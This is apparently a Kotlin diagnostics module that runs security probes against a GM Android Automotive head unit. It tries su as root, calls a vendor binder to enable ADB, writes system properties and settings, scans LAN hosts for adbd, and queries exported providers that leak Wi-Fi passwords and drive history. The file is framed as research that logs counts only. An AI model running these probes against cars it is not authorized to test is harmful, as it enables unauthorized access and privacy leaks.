package com.openautolink.app.diagnostics

import android.content.Context
import android.provider.Settings
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader

/**
 * Pen-test probes derived from the GM AAOS recon (see recon_dump/gm-aaos-recon.md §10, local-only / gitignored).
 *
 * Each probe is read-only-by-default and captures the failure mode (SecurityException,
 * SELinux denial, missing binary, etc.) without crashing. Run on demand from the
 * Debug tab — none of this code runs unless the user explicitly triggers it.
 *
 * Findings these probes verify on the live head unit:
 *   A. /system/xbin/su 0,0,0 <cmd>  — referenced by dead code in RemoteDeviceService.
 *      If the binary exists and is exec-able from our UID, we are root.
 *   B. ServiceManager.getService("com.gm.server.screenprojection.RDMSADBHandler")
 *      — the AIDL binder that flips USB role-reversal and enables ADB.
 *   C. vendor.gm.test.adb system property — polled at 1 Hz by RemoteDeviceService.
 *      Setting it to 1 triggers the full ADB-enable sequence.
 *   D. Settings.Global writes (development_settings_enabled, adb_enabled,
 *      adb_wifi_enabled) — should all SecurityException for untrusted_app; the
 *      exception class tells us which gate denied the write.
 */
object GmReconProbe {

    private const val TAG = "GmReconProbe"
    private const val RDMS_SERVICE_NAME = "com.gm.server.screenprojection.RDMSADBHandler"
    private const val RDMS_DESCRIPTOR = "gm.connection.IRDMSADBHandler"
    private const val PROP_VENDOR_GM_TEST_ADB = "vendor.gm.test.adb"

    data class ProbeOutcome(
        val name: String,
        val status: Status,
        val detail: String,
    ) {
        enum class Status { WIN, BLOCKED, INFO, ERROR }
    }

    data class Result(
        val timestampMs: Long,
        val outcomes: List<ProbeOutcome>,
    )

    suspend fun run(context: Context): Result = withContext(Dispatchers.IO) {
        val out = mutableListOf<ProbeOutcome>()

        out += probeSuBinary("/system/xbin/su")
        out += probeSuBinary("/system/bin/su")
        out += probeSuBinary("/sbin/su")
        out += probeSuExec("/system/xbin/su")
        out += probeSuExec("/system/bin/su")

        out += probeRdmsBinder()

        out += probeReadGmProperty(PROP_VENDOR_GM_TEST_ADB)
        out += probeReadGmProperty("vendor.gm.test.adb.ui.enable")
        out += probeReadGmProperty("persist.gm.adb.enabled")
        out += probeReadGmProperty("persist.vendor.gm.rro_brand_display_type")
        out += probeReadGmProperty("ro.build.tags")

        out += probeWriteGmProperty(PROP_VENDOR_GM_TEST_ADB, "1")

        out += probeWriteGlobalSetting(context, "development_settings_enabled", 1)
        out += probeWriteGlobalSetting(context, Settings.Global.ADB_ENABLED, 1)
        out += probeWriteGlobalSetting(context, "adb_wifi_enabled", 1)

        out += probeAdboverBcsScript()
        out += probeAdbServiceProperty()

        // ── Phase 2: dig into the live USB / ADB state ──────────────
        // First Phase 1 run on a Blazer EV confirmed:
        //   • init.svc.adbd = running           (adbd already alive)
        //   • sys.usb.config = mtp,adb          (gadget already includes adb)
        //   • sys.usb.controller = a800000.dwc3 (native UDC selected)
        //   • /system/bin/ADBoverBCS.sh exists, readable AND executable as us
        // So the only thing keeping a USB cable from enumerating is the
        // bridge-chip hub port direction. These probes investigate that.

        out += probeReadScript("/system/bin/ADBoverBCS.sh")
        out += probeReadScript("/system/bin/carplay.sh")
        out += probeReadScript("/system/bin/carplay1.sh")
        out += probeReadScript("/system/bin/carplay2.sh")
        out += probeReadScript("/system/bin/carplay3.sh")

        out += probeAdbListening()
        out += probeProcNetTcp()
        out += probeTypecRoles()
        out += probeUsbGadgetState()
        out += probeBridgeChipSysfs()
        out += probeNetworkInterfaces()
        out += probeAdbOnLanGateways(context)

        // ── Phase 3: Round-3 audit findings (gm-aaos-recon §12) ─────
        // Verify the DDB DeviceConnectionProvider paired-phone disclosure
        // bug live on the head unit. Reads only the columns + row counts —
        // does NOT dump WiFi passwords or other PII to logs.
        out += probeDdbContentProvider(context)

        // ── Round-5 audit: com.gm.vehicleinfo unprotected providers (§14) ─
        // Two ContentProviders declared exported with no android:permission.
        // EnergyEfficiencyGraphProvider: query() returns null (write-only,
        //   but insert() accepts arbitrary CarPropertyValues from any app —
        //   UI-spoof vector against GM's efficiency graph). Not probed live
        //   because writing is destructive to user data.
        // HistoryProvider: query() has NO permission check and returns real
        //   timeseries cursors of motor power / torque / battery level.
        //   Selection arg must be "SELECTION_HISTORY_DATA" or
        //   "SELECTION_HISTORY_TIMESTAMP".
        out += probeVehicleInfoHistoryProvider(context)

        // Bonus useful properties
        out += probeReadGmProperty("service.adb.tcp.port")
        out += probeReadGmProperty("persist.adb.tcp.port")
        out += probeReadGmProperty("sys.usb.adbPort")
        out += probeReadGmProperty("sys.dabridge.dev.portnum")
        out += probeReadGmProperty("sys.dabridge.host.portnum")
        out += probeReadGmProperty("ro.adb.secure")
        out += probeReadGmProperty("ro.debuggable")

        Result(timestampMs = System.currentTimeMillis(), outcomes = out)
    }

    // ── Probe A: /system/xbin/su existence + exec ────────────────────

    private fun probeSuBinary(path: String): ProbeOutcome {
        val f = java.io.File(path)
        if (!f.exists()) {
            return ProbeOutcome("file $path", ProbeOutcome.Status.INFO, "does not exist")
        }
        val canRead = f.canRead()
        val canExec = f.canExecute()
        val mode = try {
            // Best-effort mode read via stat
            val p = Runtime.getRuntime().exec(arrayOf("stat", "-c", "%a %U %G", path))
            BufferedReader(InputStreamReader(p.inputStream)).readLine()?.trim() ?: "?"
        } catch (_: Exception) { "?" }
        val status = if (canExec) ProbeOutcome.Status.WIN else ProbeOutcome.Status.BLOCKED
        return ProbeOutcome(
            "file $path",
            status,
            "exists size=${f.length()} read=$canRead exec=$canExec mode=$mode",
        )
    }

    private fun probeSuExec(path: String): ProbeOutcome {
        if (!java.io.File(path).exists()) {
            return ProbeOutcome("exec $path 0,0,0 id", ProbeOutcome.Status.INFO, "binary missing")
        }
        return try {
            // Invocation format from UsbUtils.execScript() in RemoteDeviceService:
            //   /system/xbin/su 0,0,0 <command>
            // (uid,gid,supplementary-gids — run the command as root.)
            val p = ProcessBuilder(listOf(path, "0,0,0", "id"))
                .redirectErrorStream(true)
                .start()
            val output = BufferedReader(InputStreamReader(p.inputStream)).readText().trim()
            p.waitFor()
            val win = output.contains("uid=0") || output.contains("u:r:su:")
            ProbeOutcome(
                "exec $path 0,0,0 id",
                if (win) ProbeOutcome.Status.WIN else ProbeOutcome.Status.BLOCKED,
                if (output.isEmpty()) "exit=${p.exitValue()} (no output)" else output.take(160),
            )
        } catch (e: Exception) {
            ProbeOutcome(
                "exec $path 0,0,0 id",
                ProbeOutcome.Status.BLOCKED,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    // ── Probe B: RDMSADBHandler binder via reflection ────────────────

    private fun probeRdmsBinder(): ProbeOutcome {
        return try {
            val smCls = Class.forName("android.os.ServiceManager")
            val getService = smCls.getMethod("getService", String::class.java)
            val binder = getService.invoke(null, RDMS_SERVICE_NAME) as? android.os.IBinder
            if (binder == null) {
                ProbeOutcome(
                    "binder $RDMS_SERVICE_NAME",
                    ProbeOutcome.Status.BLOCKED,
                    "ServiceManager.getService returned null (SELinux service_manager:find " +
                        "almost certainly denied)",
                )
            } else {
                val iface = try { binder.interfaceDescriptor ?: "?" } catch (_: Exception) { "?" }
                val isAlive = try { binder.isBinderAlive } catch (_: Exception) { false }
                // We do NOT call RDMSADBEnable here. Reaching the binder at all is the win signal;
                // toggling ADB is a separate explicit action gated by a confirmation dialog.
                ProbeOutcome(
                    "binder $RDMS_SERVICE_NAME",
                    ProbeOutcome.Status.WIN,
                    "got binder desc=$iface alive=$isAlive — RDMSADBEnable(true) is reachable",
                )
            }
        } catch (e: Exception) {
            ProbeOutcome(
                "binder $RDMS_SERVICE_NAME",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    /**
     * Attempt to actually flip ADB on via the RDMS binder. Separated from the probe
     * because it has real side effects (USB role reversal). Only call from a
     * confirmation flow in the UI.
     *
     * Returns the IRDMSADBHandler.RDMSADBEnable return code, or null on failure.
     * 0 = success per RDMSADBHandler.ADB_ENABLE_SUCCESS.
     */
    fun callRdmsAdbEnable(enable: Boolean): Pair<Boolean, String> {
        return try {
            val smCls = Class.forName("android.os.ServiceManager")
            val binder = smCls.getMethod("getService", String::class.java)
                .invoke(null, RDMS_SERVICE_NAME) as? android.os.IBinder
                ?: return false to "ServiceManager.getService returned null"

            val data = android.os.Parcel.obtain()
            val reply = android.os.Parcel.obtain()
            try {
                data.writeInterfaceToken(RDMS_DESCRIPTOR)
                data.writeInt(if (enable) 1 else 0)
                // TRANSACTION_RDMSADBEnable = 1 per the AIDL stub
                val ok = binder.transact(1, data, reply, 0)
                if (!ok) return false to "binder.transact returned false"
                reply.readException()
                val ret = reply.readInt()
                true to "RDMSADBEnable returned $ret (0=success)"
            } finally {
                reply.recycle()
                data.recycle()
            }
        } catch (e: Exception) {
            false to "${e.javaClass.simpleName}: ${e.message?.take(160)}"
        }
    }

    // ── Probe C: vendor.gm.* property read/write via reflection ──────

    private fun probeReadGmProperty(key: String): ProbeOutcome {
        return try {
            val cls = Class.forName("android.os.SystemProperties")
            val get = cls.getMethod("get", String::class.java)
            val value = get.invoke(null, key) as? String
            if (value.isNullOrEmpty()) {
                ProbeOutcome("getprop $key", ProbeOutcome.Status.INFO, "(empty / unset)")
            } else {
                ProbeOutcome("getprop $key", ProbeOutcome.Status.INFO, value.take(160))
            }
        } catch (e: Exception) {
            ProbeOutcome(
                "getprop $key",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    private fun probeWriteGmProperty(key: String, value: String): ProbeOutcome {
        return try {
            val cls = Class.forName("android.os.SystemProperties")
            val set = cls.getMethod("set", String::class.java, String::class.java)
            set.invoke(null, key, value)
            // If we got here without exception, read it back to confirm
            val readBack = cls.getMethod("get", String::class.java).invoke(null, key) as? String
            if (readBack == value) {
                ProbeOutcome(
                    "setprop $key=$value",
                    ProbeOutcome.Status.WIN,
                    "write succeeded — read-back = '$readBack'. Wait 1s and " +
                        "RemoteDeviceService.monitorAdb thread should pick this up.",
                )
            } else {
                ProbeOutcome(
                    "setprop $key=$value",
                    ProbeOutcome.Status.BLOCKED,
                    "no exception but read-back returned '$readBack' (SELinux silently dropped write)",
                )
            }
        } catch (e: Exception) {
            ProbeOutcome(
                "setprop $key=$value",
                ProbeOutcome.Status.BLOCKED,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    // ── Probe D: Settings.Global write attempts ──────────────────────

    private fun probeWriteGlobalSetting(context: Context, key: String, value: Int): ProbeOutcome {
        val before = try {
            Settings.Global.getInt(context.contentResolver, key, -1).toString()
        } catch (_: Exception) { "?" }
        return try {
            val ok = Settings.Global.putInt(context.contentResolver, key, value)
            val after = try {
                Settings.Global.getInt(context.contentResolver, key, -1).toString()
            } catch (_: Exception) { "?" }
            if (ok && after == value.toString()) {
                ProbeOutcome(
                    "Settings.Global $key=$value",
                    ProbeOutcome.Status.WIN,
                    "putInt returned true, before='$before' after='$after'",
                )
            } else {
                ProbeOutcome(
                    "Settings.Global $key=$value",
                    ProbeOutcome.Status.BLOCKED,
                    "putInt=$ok, before='$before' after='$after'",
                )
            }
        } catch (e: SecurityException) {
            ProbeOutcome(
                "Settings.Global $key=$value",
                ProbeOutcome.Status.BLOCKED,
                "SecurityException: ${e.message?.take(120)} (need WRITE_SECURE_SETTINGS)",
            )
        } catch (e: Exception) {
            ProbeOutcome(
                "Settings.Global $key=$value",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    // ── Bonus: scripts and services referenced by RDMS ───────────────

    private fun probeAdboverBcsScript(): ProbeOutcome {
        val path = "/system/bin/ADBoverBCS.sh"
        val f = java.io.File(path)
        return if (!f.exists()) {
            ProbeOutcome("file $path", ProbeOutcome.Status.INFO, "does not exist")
        } else {
            ProbeOutcome(
                "file $path",
                ProbeOutcome.Status.INFO,
                "exists size=${f.length()} read=${f.canRead()} exec=${f.canExecute()}",
            )
        }
    }

    private fun probeAdbServiceProperty(): ProbeOutcome {
        return try {
            val cls = Class.forName("android.os.SystemProperties")
            val get = cls.getMethod("get", String::class.java)
            val svc = get.invoke(null, "init.svc.adbd") as? String
            val sysUsb = get.invoke(null, "sys.usb.config") as? String
            val usbCtrl = get.invoke(null, "sys.usb.controller") as? String
            val muxState = try {
                java.io.File("/sys/class/typec/port0/data_role").readText().trim()
            } catch (_: Exception) { "?" }
            ProbeOutcome(
                "adb state snapshot",
                ProbeOutcome.Status.INFO,
                "init.svc.adbd='$svc' sys.usb.config='$sysUsb' " +
                    "sys.usb.controller='$usbCtrl' usb_data_role='$muxState'",
            )
        } catch (e: Exception) {
            ProbeOutcome(
                "adb state snapshot",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    // ── Phase 2 probes ───────────────────────────────────────────────

    /**
     * Read a shell script verbatim. Phase 1 confirmed ADBoverBCS.sh is
     * readable from our UID, so its contents tell us the exact unlock recipe.
     */
    private fun probeReadScript(path: String): ProbeOutcome {
        val f = java.io.File(path)
        if (!f.exists()) {
            return ProbeOutcome("read $path", ProbeOutcome.Status.INFO, "does not exist")
        }
        if (!f.canRead()) {
            return ProbeOutcome(
                "read $path",
                ProbeOutcome.Status.BLOCKED,
                "exists size=${f.length()} but not readable from our UID",
            )
        }
        return try {
            val content = f.readText().take(2048)
            ProbeOutcome(
                "read $path",
                ProbeOutcome.Status.WIN,
                "size=${f.length()} exec=${f.canExecute()}\n--- contents ---\n$content",
            )
        } catch (e: Exception) {
            ProbeOutcome(
                "read $path",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    /**
     * Probe whether adbd is listening on any TCP port locally. If it is and
     * the port is reachable from a connected WiFi peer, wireless ADB works
     * without needing the bridge-chip dance at all.
     */
    private fun probeAdbListening(): ProbeOutcome {
        val candidatePorts = listOf(5555, 5037, 5038, 5039, 5556, 5557, 7555, 7777)
        val open = mutableListOf<Int>()
        for (port in candidatePorts) {
            try {
                java.net.Socket().use { s ->
                    s.connect(java.net.InetSocketAddress("127.0.0.1", port), 250)
                    open += port
                }
            } catch (_: Exception) {
                // closed
            }
        }
        return if (open.isEmpty()) {
            ProbeOutcome(
                "localhost adb ports",
                ProbeOutcome.Status.INFO,
                "none of ${candidatePorts.joinToString()} are listening locally",
            )
        } else {
            ProbeOutcome(
                "localhost adb ports",
                ProbeOutcome.Status.WIN,
                "OPEN: ${open.joinToString()} — try `adb connect <car-ip>:${open.first()}`",
            )
        }
    }

    /**
     * /proc/net/tcp is world-readable on most Android images. Lists every
     * TCP listening socket (state=0A) — tells us exactly what daemons are
     * accepting connections on this device.
     */
    private fun probeProcNetTcp(): ProbeOutcome {
        return try {
            val tcpFile = java.io.File("/proc/net/tcp")
            val tcp6File = java.io.File("/proc/net/tcp6")
            val listening = mutableListOf<String>()
            for (f in listOf(tcpFile, tcp6File)) {
                if (!f.canRead()) continue
                f.forEachLine { line ->
                    val parts = line.trim().split(Regex("\\s+"))
                    if (parts.size < 4) return@forEachLine
                    val local = parts[1]
                    val state = parts[3]
                    if (state == "0A") {
                        val (hexAddr, hexPort) = local.split(":").let { it[0] to it[1] }
                        val port = hexPort.toIntOrNull(16) ?: return@forEachLine
                        // Skip super-common ports we don't care about
                        if (port in listOf(5060, 5353)) return@forEachLine
                        listening += "${f.name}:$port (addr=$hexAddr)"
                    }
                }
            }
            if (listening.isEmpty()) {
                ProbeOutcome(
                    "/proc/net/tcp listeners",
                    ProbeOutcome.Status.INFO,
                    "no readable listeners (file may not be world-readable)",
                )
            } else {
                ProbeOutcome(
                    "/proc/net/tcp listeners",
                    ProbeOutcome.Status.INFO,
                    listening.joinToString("\n"),
                )
            }
        } catch (e: Exception) {
            ProbeOutcome(
                "/proc/net/tcp listeners",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    /**
     * Read every typec port's role files. This tells us which port the
     * armrest USB-A connector is on and what state it's in (host vs device).
     */
    private fun probeTypecRoles(): ProbeOutcome {
        return try {
            val root = java.io.File("/sys/class/typec")
            if (!root.exists()) {
                return ProbeOutcome("typec ports", ProbeOutcome.Status.INFO, "/sys/class/typec missing")
            }
            val lines = mutableListOf<String>()
            root.listFiles()?.sorted()?.forEach { port ->
                if (!port.name.startsWith("port")) return@forEach
                val data = readSysfs(port, "data_role")
                val power = readSysfs(port, "power_role")
                val mode = readSysfs(port, "port_type")
                val state = readSysfs(port, "usb_power_delivery_revision")
                lines += "${port.name}: data=$data power=$power type=$mode pd=$state"
            }
            ProbeOutcome(
                "typec ports",
                ProbeOutcome.Status.INFO,
                if (lines.isEmpty()) "no port* entries" else lines.joinToString("\n"),
            )
        } catch (e: Exception) {
            ProbeOutcome(
                "typec ports",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    private fun readSysfs(dir: java.io.File, name: String): String =
        try { java.io.File(dir, name).takeIf { it.canRead() }?.readText()?.trim() ?: "?" }
        catch (_: Exception) { "?" }

    /**
     * Dump current ConfigFS USB gadget state. Tells us which UDC is bound
     * to which gadget config (g1 = CarPlay, g3 = CarLife per init.rc).
     */
    private fun probeUsbGadgetState(): ProbeOutcome {
        return try {
            val root = java.io.File("/config/usb_gadget")
            if (!root.exists()) {
                return ProbeOutcome(
                    "usb_gadget configfs",
                    ProbeOutcome.Status.INFO,
                    "/config/usb_gadget missing or not visible to our UID",
                )
            }
            val lines = mutableListOf<String>()
            root.listFiles()?.sorted()?.forEach { gadget ->
                if (!gadget.isDirectory) return@forEach
                val udc = readSysfs(gadget, "UDC")
                val functions = java.io.File(gadget, "functions").listFiles()
                    ?.joinToString(",") { it.name } ?: "?"
                lines += "${gadget.name}: UDC='$udc' functions=$functions"
            }
            ProbeOutcome(
                "usb_gadget configfs",
                ProbeOutcome.Status.INFO,
                if (lines.isEmpty()) "no gadget dirs visible" else lines.joinToString("\n"),
            )
        } catch (e: Exception) {
            ProbeOutcome(
                "usb_gadget configfs",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    /**
     * Look for the bridge-chip dabridge driver and report its visible state.
     * From init.carlife.rc: /sys/bus/usb/drivers/dabridge/bridgeport selects
     * which physical port the head unit routes USB through.
     */
    private fun probeBridgeChipSysfs(): ProbeOutcome {
        val candidates = listOf(
            "/sys/bus/usb/drivers/dabridge",
            "/sys/bus/usb/drivers/dabridge/bridgeport",
            "/sys/class/dabridge",
        )
        val found = mutableListOf<String>()
        for (p in candidates) {
            val f = java.io.File(p)
            if (f.exists()) {
                val content = if (f.isFile && f.canRead()) {
                    try { ": '${f.readText().trim()}'" } catch (_: Exception) { "" }
                } else ""
                found += "$p (${if (f.isDirectory) "dir" else "file"})$content"
            }
        }
        return ProbeOutcome(
            "bridge-chip sysfs",
            if (found.isNotEmpty()) ProbeOutcome.Status.INFO else ProbeOutcome.Status.INFO,
            if (found.isEmpty()) "no dabridge driver visible to our UID"
            else found.joinToString("\n"),
        )
    }

    /**
     * Enumerate every network interface visible to the app. `java.net.NetworkInterface`
     * doesn't require any permission. Reveals the chip-to-chip usb0 (192.168.2.20),
     * the WiFi LAN side, and any DHCP'd USB-host clients on the armrest port.
     */
    private fun probeNetworkInterfaces(): ProbeOutcome {
        return try {
            val lines = mutableListOf<String>()
            for (nif in java.net.NetworkInterface.getNetworkInterfaces()) {
                val addrs = nif.inetAddresses.asSequence()
                    .filterIsInstance<java.net.Inet4Address>()
                    .map { it.hostAddress }
                    .toList()
                if (addrs.isEmpty() && !nif.isUp) continue
                val flags = buildList {
                    if (nif.isUp) add("up")
                    if (nif.isLoopback) add("lo")
                    if (nif.isPointToPoint) add("p2p")
                    if (nif.supportsMulticast()) add("multi")
                }.joinToString(",")
                lines += "${nif.name} [${addrs.joinToString()}] $flags"
            }
            ProbeOutcome(
                "net interfaces",
                ProbeOutcome.Status.INFO,
                if (lines.isEmpty()) "no interfaces" else lines.joinToString("\n"),
            )
        } catch (e: Exception) {
            ProbeOutcome(
                "net interfaces",
                ProbeOutcome.Status.ERROR,
                "${e.javaClass.simpleName}: ${e.message?.take(120)}",
            )
        }
    }

    /**
     * Scan candidate adbd ports on every reachable LAN gateway (DHCP gateway,
     * any neighbour on our /24, plus the known internal 192.168.2.20 and 192.168.222.1).
     * If adbd is bound to 0.0.0.0:5555, this will see it from the head unit even
     * when our localhost probe is SELinux-blocked.
     */
    private fun probeAdbOnLanGateways(context: Context): ProbeOutcome {
        val targets = mutableSetOf<String>()

        // DHCP gateway via WifiManager (works without LOCATION on AAOS for own AP info)
        try {
            val wifi = context.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
            @Suppress("DEPRECATION")
            wifi?.dhcpInfo?.let { dhcp ->
                if (dhcp.gateway != 0) targets += intToIp(dhcp.gateway)
                if (dhcp.serverAddress != 0) targets += intToIp(dhcp.serverAddress)
                if (dhcp.ipAddress != 0) {
                    // Probe our own IP too (adbd may listen on 0.0.0.0)
                    targets += intToIp(dhcp.ipAddress)
                }
            }
        } catch (_: Exception) { /* swallow */ }

        // Known GM AAOS addresses from the recon
        targets += "192.168.2.20"   // internal usb0
        targets += "192.168.222.1"  // car WiFi hotspot gateway (older trim)
        targets += "127.0.0.1"      // localhost (will likely be SELinux-blocked, but log it)

        // Every IPv4 address on every up, non-loopback interface — when we
        // run on the head unit this includes the WiFi AP IP (e.g. 10.23.12.53)
        // and the internal usb0 (192.168.2.20). adbd bound to 0.0.0.0:5555 will
        // be reachable via any of these even when localhost is SELinux-blocked.
        try {
            for (nif in java.net.NetworkInterface.getNetworkInterfaces()) {
                if (!nif.isUp || nif.isLoopback) continue
                for (addr in nif.inetAddresses) {
                    if (addr !is java.net.Inet4Address) continue
                    targets += addr.hostAddress
                    val parts = addr.hostAddress.split(".")
                    if (parts.size == 4) {
                        // Also try the .1 (some configs put adbd only on the gateway VIP)
                        targets += "${parts[0]}.${parts[1]}.${parts[2]}.1"
                    }
                }
            }
        } catch (_: Exception) { /* swallow */ }

        val ports = listOf(5555, 5037, 5556, 4444, 7555)
        val hits = mutableListOf<String>()
        for (host in targets) {
            for (port in ports) {
                try {
                    java.net.Socket().use { s ->
                        s.connect(java.net.InetSocketAddress(host, port), 400)
                        // Read a banner — adbd sends nothing on connect, but
                        // a successful connect itself is the signal we care about.
                        val banner = try {
                            s.soTimeout = 300
                            val buf = ByteArray(64)
                            val n = s.getInputStream().read(buf)
                            if (n > 0) String(buf, 0, n).filter { it.code in 32..126 }.take(40)
                            else ""
                        } catch (_: Exception) { "" }
                        hits += "$host:$port${if (banner.isNotEmpty()) " banner='$banner'" else ""}"
                    }
                } catch (_: Exception) { /* closed/timeout */ }
            }
        }
        return if (hits.isEmpty()) {
            ProbeOutcome(
                "adb on LAN",
                ProbeOutcome.Status.INFO,
                "scanned ${targets.size} hosts × ${ports.size} ports — nothing reachable. " +
                    "Targets: ${targets.joinToString()}",
            )
        } else {
            ProbeOutcome(
                "adb on LAN",
                ProbeOutcome.Status.WIN,
                "OPEN ports — try `adb connect` to one:\n${hits.joinToString("\n")}",
            )
        }
    }

    private fun intToIp(addr: Int): String =
        "${addr and 0xFF}.${addr shr 8 and 0xFF}.${addr shr 16 and 0xFF}.${addr shr 24 and 0xFF}"

    // ── Phase 3 probe: DDB DeviceConnectionProvider (gm-aaos-recon §12.1) ──

    /**
     * Verifies the paired-phone ContentProvider disclosure bug (Finding D).
     * Queries each of the three tables in the DDB provider via a URI that
     * any app can construct. Reports row counts and the presence of
     * sensitive column names — does NOT log actual values, so running the
     * probe on a real car does not leak the user's WiFi passwords or BT
     * addresses to our logs.
     */
    private fun probeDdbContentProvider(context: Context): ProbeOutcome {
        val sensitiveCols = setOf(
            "wifi_pwd", "vehicle_wf_pwd", "remote_wf_ap_pwd", "hidden_wf_ap_pwd",
            "bt_addr", "wp_bluetooth_address", "usb_bluetooth_address",
            "imei_number", "device_serial_number", "wp_usb_serial_number",
            "token", "ssid", "vehicle_hotspot_ssid", "remote_wf_ap_ssid",
            "hidden_wf_ap_ssid", "mac_addr", "wifi_mac",
        )
        val tables = listOf("devices", "property", "vca_devices")
        val results = mutableListOf<String>()
        var totalSensitive = 0
        var totalRows = 0

        for (table in tables) {
            val uri = android.net.Uri.parse("content://com.gm.ddb_contentprovider/$table")
            try {
                context.contentResolver.query(uri, null, null, null, null)?.use { c ->
                    val cols = c.columnNames.toSet()
                    val sensitiveInTable = cols.intersect(sensitiveCols)
                    totalSensitive += sensitiveInTable.size
                    totalRows += c.count
                    results += "$table: ${c.count} row(s), " +
                        "${cols.size} cols, ${sensitiveInTable.size} sensitive " +
                        "(${sensitiveInTable.joinToString().take(80)})"
                } ?: run {
                    results += "$table: query returned null"
                }
            } catch (e: SecurityException) {
                results += "$table: SecurityException — ${e.message?.take(80)}"
            } catch (e: Exception) {
                results += "$table: ${e.javaClass.simpleName} — ${e.message?.take(80)}"
            }
        }

        val status = if (totalRows > 0 || totalSensitive > 0) {
            ProbeOutcome.Status.WIN
        } else if (results.any { it.contains("Security") }) {
            ProbeOutcome.Status.BLOCKED
        } else {
            ProbeOutcome.Status.INFO
        }
        return ProbeOutcome(
            "DDB provider (paired-phone leak)",
            status,
            results.joinToString("\n") + if (totalRows > 0) "\n→ Finding D CONFIRMED on this car" else "",
        )
    }

    /**
     * Probes com.gm.vehicleinfo.HistoryProvider — exported with no
     * android:permission, query() has no runtime check (verified by
     * decompiling the APK, see recon_dump/gm-aaos-recon.md §15).
     *
     * Returns timeseries cursors for:
     *   history/e_power     — electric motor power (W)
     *   history/e_torque    — electric motor torque (Nm)
     *   history/e_battery   — battery level
     *   history/ice_power   — ICE power (irrelevant on EV)
     *   history/ice_torque  — ICE torque (irrelevant on EV)
     *
     * Selection arg must be "SELECTION_HISTORY_DATA" (values) or
     * "SELECTION_HISTORY_TIMESTAMP" (timestamps in ms).
     *
     * Reports row counts only — no actual timeseries data is logged.
     */
    private fun probeVehicleInfoHistoryProvider(context: Context): ProbeOutcome {
        val authority = "com.gm.vehicleinfo.HistoryProvider"
        val paths = listOf("history/e_power", "history/e_torque", "history/e_battery",
                           "history/ice_power", "history/ice_torque")
        val results = mutableListOf<String>()
        var anyRows = 0
        var anyOpened = false
        for (path in paths) {
            val uri = android.net.Uri.parse("content://$authority/$path")
            try {
                context.contentResolver.query(uri, null, "SELECTION_HISTORY_DATA", null, null)?.use { c ->
                    anyOpened = true
                    anyRows += c.count
                    results += "$path: ${c.count} rows, ${c.columnNames.size} cols"
                } ?: run { results += "$path: null cursor" }
            } catch (e: SecurityException) {
                results += "$path: SecurityException"
            } catch (e: Exception) {
                results += "$path: ${e.javaClass.simpleName}"
            }
        }
        val status = when {
            anyRows > 0 -> ProbeOutcome.Status.WIN
            anyOpened -> ProbeOutcome.Status.INFO
            results.any { it.contains("Security") } -> ProbeOutcome.Status.BLOCKED
            else -> ProbeOutcome.Status.INFO
        }
        return ProbeOutcome(
            "vehicleinfo HistoryProvider",
            status,
            "$authority\n" + results.joinToString("\n") +
                if (anyRows > 0) "\n→ Finding F CONFIRMED — drive history leak" else "",
        )
    }

    // ── Dangerous action: try running ADBoverBCS.sh directly ─────────

    /**
     * Phase 1 reported /system/bin/ADBoverBCS.sh has read=true exec=true
     * from our UID. This action attempts to actually run it. Worst case
     * SELinux denies the configfs writes inside the script; best case the
     * USB hub flips and a connected laptop sees an ADB device.
     */
    fun execAdboverBcs(arg: String): Pair<Boolean, String> {
        val path = "/system/bin/ADBoverBCS.sh"
        if (!java.io.File(path).exists()) {
            return false to "binary missing"
        }
        return try {
            val p = ProcessBuilder(listOf(path, arg))
                .redirectErrorStream(true)
                .start()
            val output = BufferedReader(InputStreamReader(p.inputStream)).readText().trim()
            val finished = p.waitFor(10, java.util.concurrent.TimeUnit.SECONDS)
            if (!finished) {
                p.destroyForcibly()
                return false to "timed out after 10s"
            }
            val exit = p.exitValue()
            (exit == 0) to "exit=$exit\n${output.take(800)}"
        } catch (e: Exception) {
            false to "${e.javaClass.simpleName}: ${e.message?.take(160)}"
        }
    }
}
